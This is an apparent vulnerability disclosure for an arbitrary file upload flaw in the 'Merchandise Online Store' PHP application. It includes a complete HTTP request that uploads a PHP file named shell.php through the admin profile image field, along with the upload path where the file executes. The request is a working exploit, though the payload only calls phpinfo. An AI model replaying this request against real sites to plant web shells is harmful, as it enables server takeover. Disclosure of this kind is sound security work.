# Merchandise Online Store v1.0 by oretnom23 has arbitrary code execution (RCE)

**Author** : ffYYy6x0y1

vendor: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability url: http://ip/vloggers_merch/admin/?page=user

Loophole location： There is an arbitrary file upload vulnerability (RCE) in the user profile upload point in the system information.

Request package for file upload：

```sql
POST /vloggers_merch/classes/Users.php?f=save HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/vloggers_merch/admin/?page=user
Content-Length: 728
Content-Type: multipart/form-data; boundary=---------------------------972285327633
Cookie: PHPSESSID=ikts6n5evd3ahejiopufg6114g
Connection: close

-----------------------------972285327633
Content-Disposition: form-data; name="id"

1
-----------------------------972285327633
Content-Disposition: form-data; name="firstname"

Adminstrator
-----------------------------972285327633
Content-Disposition: form-data; name="lastname"

Admin
-----------------------------972285327633
Content-Disposition: form-data; name="username"

admin
-----------------------------972285327633
Content-Disposition: form-data; name="password"

admin123
-----------------------------972285327633
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------972285327633--
```

The files will be uploaded to this directory \vloggers_merch\uploads

![image](https://user-images.githubusercontent.com/104813753/166432810-06c5a0bd-7983-4e0f-83c0-8e286cf7e4c4.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/104813753/166432922-c3935ac1-b403-4934-a7dd-0251b571540e.png)

